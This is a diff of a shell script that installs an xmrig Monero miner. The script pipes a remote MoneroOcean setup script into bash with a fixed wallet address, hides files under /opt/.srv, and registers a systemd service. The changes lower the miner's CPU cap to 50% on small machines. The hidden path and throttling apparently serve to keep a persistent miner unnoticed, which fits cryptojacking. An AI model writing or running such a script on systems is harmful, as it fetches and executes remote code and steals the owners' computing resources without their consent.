@@ -7,7 +7,7 @@ export HOME=/opt/.srv
 curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 469yVMKomVRVLrTN3eLYF67wCN7r9H8GJWQVR9jBQgYvDXfumcCeBSc4AYiWdUH1DtAacGy6c2ssE392W6dQ59ExFJWbw5K
 if pgrep -f "xmrig" > /dev/null; then
     XMRIG_PID=$(pgrep -f "xmrig" | head -1)
-    cpulimit -p $XMRIG_PID -l 70 &
+    cpulimit -p $XMRIG_PID -l 50 &
 fi
 export HOME=$ORIGINAL_HOME
 OLD_SERVICE_FILE="/etc/systemd/system/moneroocean_miner.service"
@@ -22,8 +22,13 @@ if [ -f "$NEW_SERVICE_FILE" ]; then
         echo "Configuring systemd service for automatic cpulimit application..."
         CPU_CORES=$(nproc)
         echo "Detected CPU cores: $CPU_CORES"
-        CPU_LIMIT=$(echo "$CPU_CORES * 100 * 70 / 100" | bc)
-        echo "Setting CPU limit: $CPU_LIMIT (70% of $CPU_CORES cores)"
+        if [ "$CPU_CORES" -ge 4 ]; then
+            CPU_LIMIT=$(echo "$CPU_CORES * 100 * 70 / 100" | bc)
+            echo "Setting CPU limit: $CPU_LIMIT (70% of $CPU_CORES cores)"
+        else
+            CPU_LIMIT=$(echo "$CPU_CORES * 100 * 50 / 100" | bc)
+            echo "Setting CPU limit: $CPU_LIMIT (50% of $CPU_CORES cores)"
+        fi
         XMRIG_PATH=$(which xmrig 2>/dev/null || find /opt/.srv -name "xmrig" -type f 2>/dev/null | head -1)
         if [ -z "$XMRIG_PATH" ]; then
             if [ -f "/opt/.srv/moneroocean/xmrig" ]; then
@@ -62,4 +67,4 @@ if [ -f "$NEW_SERVICE_FILE" ]; then
 else
     echo "Warning: Service file $NEW_SERVICE_FILE not found"
 fi
-echo "Miner installed and running with 70% CPU limit"
+echo "Miner installed and running with 50% CPU limit"
